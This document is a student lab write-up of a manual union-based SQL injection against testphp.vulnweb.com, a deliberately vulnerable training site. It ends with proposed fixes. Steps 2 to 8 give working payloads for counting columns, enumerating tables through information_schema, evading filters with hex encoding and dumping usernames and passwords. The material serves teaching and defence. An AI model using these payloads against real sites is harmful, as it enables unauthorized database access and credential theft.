# Mini Project 06: SQL Injection Attack on testphp.vulnweb.com

## Summary

Performed a successful manual SQL Injection attack on `http://testphp.vulnweb.com`, an intentionally vulnerable website used for educational purposes.  
This project demonstrates step-by-step exploitation, from testing input vulnerability to extracting database info, table names, and user credentials.

---

## Objective

- Confirm if the web app is vulnerable to SQLi  
- Use union-based SQL Injection to extract database information  
- Identify users and their passwords from the backend

---

## Environment

- Target URL: `http://testphp.vulnweb.com`
- Tools: Web browser (manual testing only)

---

## Attack Demonstration

### Step 1: Check DB Connectivity

- **URL:** `http://testphp.vulnweb.com/listproducts.php?cat=1`
- Clicking "Browse Categories" changes the URL → indicates DB connection.

---

### Step 2: Check for SQL Injection

- **Payload:** `?cat=1'`
- **Result:** Error in response → Site is **vulnerable** to SQL injection.

---

### Step 3: Find Number of Columns

- **Payload (success):**  
  `?cat=1 order by 1` → ✅  
- **Payload (fail):**  
  `?cat=1 order by 12` → ❌  

➡️ Total usable columns: **11**

---

### Step 4: Find Vulnerable Columns

- **Payload:**  
  `?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11`

- **Result:** Column 7 displayed → column 7 is injectable

---

### Step 5: Get Database Name

- **Payload:**  
  `?cat=1 union select 1,2,3,4,5,6,database(),8,9,10,11`

- **Result:**  
  Database: `acuart`

---

### Step 6: Get Table Names

- **Payload:**  
  ?cat=1 union select 1,2,3,4,5,6,group_concat(table_name),8,9,10,11
from information_schema.tables where table_schema=database()

- **Result:**  
`artists,carts,categ,featured,guestbook,pictures,products,users`  
➡️ Target table: `users`

---

### Step 7: Get Column Names from `users` Table

- **Payload:**  
  ?cat=1 union select 1,2,3,4,5,6,group_concat(column_name),8,9,10,11
from information_schema.columns where table_name=0x7573657273

- **Result:**  
`address,cart,cc,email,name,pass,phone,uname`  
➡️ Target columns: `uname`, `pass`

---

### Step 8: Dump User Credentials

- **Payload:**  
  ?cat=1 union select 1,2,3,4,5,6,group_concat(uname,0x3A0A,pass),8,9,10,11
from users

- **Result:**  
`Username: test`  
`Password: test`

---

## Findings & Fixes

### a. Database Accepts Input from URL

- **Risk:** SQL commands executed from URL  
- **Fix:** Use parameterized queries and prepared statements.

### b. Broken Error Handling

- **Risk:** No proper 404 or input validation feedback  
- **Fix:** Add error pages and input sanitization.

### c. Firewall Can Be Bypassed

- **Risk:** Encoded inputs (like hex values) bypass filters  
- **Fix:** Use behavioral rules, not just string-based filters.

---

## Conclusion

The test site was successfully exploited using SQL injection.  
Findings demonstrate real-world issues such as:
- Input fields directly affecting SQL queries
- Lack of input validation and error handling
- Insufficient web application firewall (WAF) logic

> Fixing these issues in test environments builds skills to prevent them in production systems.
